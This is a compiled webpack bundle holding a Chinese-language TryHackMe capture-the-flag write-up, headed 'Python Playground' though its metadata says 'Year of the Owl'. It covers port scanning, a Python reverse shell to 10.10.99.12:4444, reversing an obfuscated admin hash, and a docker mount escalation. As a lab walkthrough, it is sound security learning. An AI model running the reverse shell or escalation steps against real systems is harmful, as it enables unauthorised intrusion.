"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[4955],{33828:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>p,frontMatter:()=>s,metadata:()=>a,toc:()=>c});var r=t(74848),o=t(28453);const s={sidebar_position:177,tags:["Medium","Linux","\u5bc6\u7801\u5b66","docker"],title:"Year of the Owl",description:"Year of the Owl",sidebar_label:"Year of the Owl",slug:"/tryhackme/177"},i="Python Playground",a={id:"box/TryHackMe/177",title:"Year of the Owl",description:"Year of the Owl",source:"@site/docs/box/TryHackMe/177.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/177",permalink:"/docs/tryhackme/177",draft:!1,unlisted:!1,tags:[{label:"Medium",permalink:"/docs/tags/medium"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u5bc6\u7801\u5b66",permalink:"/docs/tags/\u5bc6\u7801\u5b66"},{label:"docker",permalink:"/docs/tags/docker"}],version:"current",sidebarPosition:177,frontMatter:{sidebar_position:177,tags:["Medium","Linux","\u5bc6\u7801\u5b66","docker"],title:"Year of the Owl",description:"Year of the Owl",sidebar_label:"Year of the Owl",slug:"/tryhackme/177"},sidebar:"boxSidebar",previous:{title:"Year of the Owl",permalink:"/docs/tryhackme/176"},next:{title:"Ra 2",permalink:"/docs/tryhackme/178"}},d={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"root(docker)",id:"rootdocker",level:3},{value:"root(docker) \u2014&gt; connor(172.17.0.1)",id:"rootdocker--connor1721701",level:3},{value:"connor(172.17.0.1) \u2014&gt; root(172.17.0.1)",id:"connor1721701--root1721701",level:3}];function l(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"python-playground",children:"Python Playground"}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-149-250:~/pythonplayground# nmap -sTCV -p- --min-rate 1000 10.10.250.38\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-11-06 15:02 GMT\nNmap scan report for ip-10-10-250-38.eu-west-1.compute.internal (10.10.250.38)\nHost is up (0.0036s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)\n|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)\n|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (EdDSA)\n80/tcp open  http    Node.js Express framework\n|_http-title: Python Playground!\nMAC Address: 02:A4:72:EB:8E:AD (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.04 seconds\n"})}),"\n",(0,r.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-149-250:~/pythonplayground# gobuster dir -u http://10.10.250.38/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.250.38/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     html,txt\n[+] Timeout:        10s\n===============================================================\n2023/11/06 15:11:25 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/login.html (Status: 200)\n/signup.html (Status: 200)\n/admin.html (Status: 200)\n===============================================================\n2023/11/06 15:16:50 Finished\n===============================================================\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8bbf\u95ee\u4e3b\u9875\u9762\u5185\u5bb9, \u8fd9\u662f\u4e00\u4e2a SSTI \u7684\u9776\u673a, \u63a5\u7740\u67e5\u770b\u767b\u9646\u548c\u6ce8\u518c\u9875\u9762\u6211\u53d1\u73b0\u5df2\u7ecf\u4e0d\u5141\u8bb8\u767b\u9646, \u4e4b\u540e\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"admin.html"})," \u9875\u9762, \u6211\u53d1\u73b0\u5176\u4e2d\u662f\u57fa\u4e8e\u524d\u7aef\u6821\u9a8c\u7684, \u4ece\u4e0b\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u770b\u51fa\u5982\u679c\u5bc6\u7801\u6b63\u786e\u5176\u5e94\u8be5\u7b49\u4e8e\u8fd9\u4e2a hash \u503c, \u540c\u65f6\u5f53\u6211\u4eec\u767b\u9646\u6210\u529f\u91cd\u5b9a\u5411\u5230\u53e6\u4e00\u4e2a\u9875\u9762, \u4f30\u8ba1\u8fd9\u91cc\u5c31\u662f SSTI \u7684\u4f4d\u7f6e\u4e86"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204557.png",alt:"image-20240709204556431"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204606.png",alt:"image-20240709204605321"})}),"\n",(0,r.jsx)(n.p,{children:"\u4ece\u4e0a\u9762\u53ef\u4ee5\u770b\u51fa\u8fd9\u662f\u4e00\u4e2a python \u6846, \u53ef\u4ee5\u6267\u884c\u547d\u4ee4 ,"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204614.png",alt:"image-20240709204613543"})}),"\n",(0,r.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(n.h3,{id:"rootdocker",children:"root(docker)"}),"\n",(0,r.jsx)(n.p,{children:"\u4ece\u4e0a\u9762\u6765\u770b\u53ef\u4ee5\u501f\u6b64\u6765\u83b7\u53d6\u4e00\u4e2a Shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'socket = __import__("socket")\nsubprocess = __import__("subprocess")\nos = __import__("os")\npty = __import__("pty")\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect(("10.10.99.12",4444));\nos.dup2(s.fileno(),0); \nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\npty.spawn("/bin/bash")\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204635.png",alt:"image-20240709204634599"})}),"\n",(0,r.jsx)(n.h3,{id:"rootdocker--connor1721701",children:"root(docker) \u2014> connor(172.17.0.1)"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u4e4b\u524d\u83b7\u53d6\u5230 ",(0,r.jsx)(n.code,{children:"admin.html"})," \u9875\u9762\u662f\u524d\u7aef\u6821\u9a8c, \u5728\u54ea\u91cc\u83b7\u53d6\u5230\u4e00\u4e2a hash \u503c, \u56e0\u6b64\u53ef\u4ee5\u5c1d\u8bd5\u5c06\u5176\u9006\u5411, \u5f97\u5230\u539f\u6587\u6765\u8fdb\u884c connor \u7528\u6237\u767b\u9646"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'hash = "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"\n\n#Strings to Integer Array\ndef rev_int_to_str(temp):\n    strs = []\n    for i in temp:\n       strs.append(ord(i)-97)\n    return strs\n#Integer Array to strings\ndef rev_str_to_int(temp):\n    strs = ""\n    for i in range(0,len(temp)-1,2):\n       temp2 = 0\n       temp2 = int(temp[i]*26)\n       temp2 += int(temp[i+1])\n       strs += chr(temp2)\n    return strs\n\npassword = rev_str_to_int(rev_int_to_str(rev_str_to_int(rev_int_to_str(hash))))\nprint(password)\n\n# spaghetti1245\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204651.png",alt:"image-20240709204649744"})}),"\n",(0,r.jsx)(n.h3,{id:"connor1721701--root1721701",children:"connor(172.17.0.1) \u2014> root(172.17.0.1)"}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f\u53ef\u4ee5\u53d1\u73b0 docker \u73af\u5883\u662f root \u7528\u6237\u542f\u52a8\u7684"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204703.png",alt:"image-20240709204702183"})}),"\n",(0,r.jsx)(n.p,{children:"\u57fa\u4e8e\u6b64\u53ef\u4ee5\u5c1d\u8bd5\u67e5\u770b\u6302\u8f7d\u4fe1\u606f, \u53d1\u73b0"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) root@playgroundweb:/# mount\n/dev/xvda2 on /mnt/log type ext4 (rw,relatime,data=ordered)\n/dev/xvda2 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered)\n/dev/xvda2 on /etc/hostname type ext4 (rw,relatime,data=ordered)\n/dev/xvda2 on /etc/hosts type ext4 (rw,relatime,data=ordered)\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u67e5\u770b\u6211\u53d1\u73b0\u8fd9\u4e2a\u76ee\u5f55\u662f\u5171\u4eab\u76ee\u5f55\u56e0\u6b64\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u8fdb\u884c\u63d0\u6743"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204709.png",alt:"image-20240709204708586"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-204713.png",alt:"image-20240709204712267"})})]})}function p(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>a});var r=t(96540);const o={},s=r.createContext(o);function i(e){const n=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:i(e.components),r.createElement(s.Provider,{value:n},e.children)}}}]);